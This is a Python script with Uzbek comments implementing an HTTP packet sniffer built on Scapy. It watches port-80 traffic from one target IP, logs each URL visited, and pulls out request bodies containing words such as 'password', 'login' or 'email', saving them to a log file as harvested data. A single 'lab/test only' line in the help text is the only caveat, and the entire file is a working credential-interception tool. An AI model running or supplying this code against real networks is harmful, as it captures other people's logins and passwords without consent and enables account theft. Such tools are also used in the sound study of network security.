import scapy.all as scapy
from scapy.layers import http
import os
import sys
import argparse
import re
from datetime import datetime

# --- RANGLAR ---
class Style:
    CYAN = '\033[36m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    RED = '\033[31m'
    RESET = '\033[0m'

LOG_FILE = "target_logs.txt"

# --- ROOT TEKSHIRUV ---
if os.geteuid() != 0:
    print(f"{Style.RED}[-] ROOT huquqi talab qilinadi.{Style.RESET}")
    sys.exit(1)

# --- IP VALIDATSIYA ---
def valid_ip(ip):
    pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    if not re.match(pattern, ip):
        raise argparse.ArgumentTypeError("Noto‘g‘ri IP format kiritildi.")
    return ip

# --- INTERFACE VALIDATSIYA ---
def valid_interface(iface):
    if iface not in scapy.get_if_list():
        raise argparse.ArgumentTypeError(f"Interface topilmadi: {iface}")
    return iface

# --- ARGPARSE ---
parser = argparse.ArgumentParser(
    description="HTTP Packet Sniffer (faqat lab/test muhitida)"
)

parser.add_argument(
    "-t", "--target",
    required=True,
    type=valid_ip,
    help="Target IP manzil (masalan: 192.168.1.10)"
)

parser.add_argument(
    "-i", "--interface",
    required=True,
    type=valid_interface,
    help="Tarmoq interfeysi (masalan: eth0, wlan0)"
)

args = parser.parse_args()

TARGET_IP = args.target
INTERFACE = args.interface

# --- LOG YOZISH ---
def write_to_log(message):
    clean_message = re.sub(r'\x1b\[[0-9;]*m', '', message)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(clean_message + "\n")
    print(message)

# --- PACKET ISHLOV ---
def packet_tutish(packet):
    if packet.haslayer(scapy.IP):
        # Target IP tekshiruvi (src host filtrda bo'lsa ham, bu qo'shimcha xavfsizlik)
        if packet[scapy.IP].src == TARGET_IP:

            if packet.haslayer(http.HTTPRequest):
                req = packet[http.HTTPRequest]
                
                # Fieldlar mavjudligini xavfsiz tekshirish
                host = req.Host.decode(errors="ignore") if req.Host else ""
                path = req.Path.decode(errors="ignore") if req.Path else ""
                url = host + path

                current_time = datetime.now().strftime("%H:%M:%S")
                log_entry = f"{Style.GREEN}[{current_time}] [{TARGET_IP}] >>> {url}{Style.RESET}"
                write_to_log(log_entry)

                if packet.haslayer(scapy.Raw):
                    try:
                        load = packet[scapy.Raw].load.decode(errors="ignore")
                        # Kengaytirilgan login/parol qidiruvi
                        keywords = ["pass","password", "user", "login", "email", "uname"]
                        if any(key in load.lower() for key in keywords):
                            cred = f"{Style.YELLOW}[!] MA'LUMOT TOPILDI: {load}{Style.RESET}"
                            write_to_log(cred)
                            write_to_log("-" * 50)
                    except:
                        pass
# --- SNIFF ---
def sniff_packets():
    print(f"{Style.CYAN}[*] Sniffer ishga tushdi | Target: {TARGET_IP} | Interface: {INTERFACE}{Style.RESET}")
    bpf_filter = f"tcp port 80 and src host {TARGET_IP}"
    scapy.sniff(
        iface=INTERFACE,
        store=False,
        prn=packet_tutish,
        filter=bpf_filter
    )

try:
    sniff_packets()
except KeyboardInterrupt:
    print(f"\n{Style.RED}[!] To‘xtatildi.{Style.RESET}")
